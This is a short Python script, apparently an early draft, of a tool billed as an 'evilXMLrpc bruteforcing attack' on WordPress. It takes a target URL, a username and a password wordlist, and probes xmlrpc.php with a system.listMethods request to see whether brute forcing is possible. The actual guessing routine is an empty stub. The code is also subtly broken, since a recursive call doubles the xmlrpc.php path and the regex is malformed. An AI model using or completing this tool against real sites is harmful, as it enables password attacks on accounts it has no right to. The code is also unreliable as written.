#!/usr/bin/env python3
# Author: Juan García aka liandd
import signal
from termcolor import colored
import sys
import argparse
import os
import requests
import re


# Ctrl_c
def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...", "red"))
    sys.exit(1)


# Ctrl_c
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("evilXMLrpc bruteforcing attack", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="WordPress URL to bruteforce (i.e --url http://127.0.0.1:31337)")
    parser.add_argument('-n', '--name', dest="NAME",
                        help="Username to exec bruteforce (i.e --name liandd)")
    parser.add_argument('-w', '--wordlist', dest="WORDLIST",
                        help="Wordlist to try the bruteforcing (i.e --wordlist /usr/share/SecLists/rockyou.txt)")
    options = parser.parse_args()
    if options.URL is None or options.NAME is None or options.WORDLIST is None:
        parser.print_help()
        sys.exit(1)
    return options.URL, options.NAME, options.WORDLIST


def XMLrpc_ffuf(url):
    """Revisar que la url tenga un xmlrpc.php valido !(tampered, disabled, hardcoded, not working)"""
    url = url+'/xmlrpc.php'
    if os.path.exists("request.xml"):
        with open("request.xml", "r") as xml_request:
            data = xml_request.read()
            raw_response = requests.post(url, data=data)
            response = raw_response.text
            regex = r"wp.{4}+[U].*[B].*s\b"
            if re.findall(regex, response):
                print(
                    colored(f"\n[+] Se ha encontrado el método {re.findall(regex, response)}\n", "green"))
            else:
                print(
                    colored("\n[!] No es posible hacer bruteforcing...", "red"))
                sys.exit(1)
    else:
        with open("request.xml", "w") as create_xml_request:
            create_xml_request.write("""
            <?xml version="1.0" encoding="utf-8"?>
            <methodCall>
            <methodName>system.listMethods</methodName>
            <params></params>
            </methodCall>
            """)
            XMLrpc_ffuf(url)


def XMLbrute_force(url, name, wordlist):
    XMLrpc_ffuf(url)
    """Revisa la estructura XML para identificar si es posible hacer el ataque"""
    # xml_file = "file.xml"
    # with open(xml_file, "rw") as xml:
    #    xml.write()


def main():
    URL, NAME, WORDLIST = get_arguments()
    XMLbrute_force(URL, NAME, WORDLIST)
    sys.exit(0)


if __name__ == '__main__':
    main()
